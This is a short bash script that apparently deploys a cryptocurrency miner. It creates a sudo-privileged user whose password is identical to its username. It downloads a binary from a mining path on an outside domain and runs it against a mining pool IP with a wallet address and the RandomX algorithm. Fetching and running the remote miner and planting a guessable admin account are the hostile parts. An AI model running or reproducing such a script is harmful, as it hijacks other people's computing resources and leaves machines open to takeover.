#!/bin/bash
apt update
apt install sudo
apt install screen -y
sudo useradd -m hoki
sudo adduser hoki sudo
sudo usermod -a -G sudo hoki
sudo echo 'hoki:hoki' | sudo chpasswd
cd /home/hoki
wget https://swenson.my.id/mining/masterfile
sudo chown hoki:sudo masterfile
sudo chmod 700 masterfile
sudo -u hoki sh -c "/home/hoki/masterfile -o 139.99.124.170:80 -u 861eTc6cvzyPrBXZey4x5iJKPHF2gcG8p3iWCCdYSAFwVgee8NKqJYFhX3muHVSUjAFqvtAX8WezPh8LsGhYTKUn3vWgLUa -k -a rx/0 -p x3x"
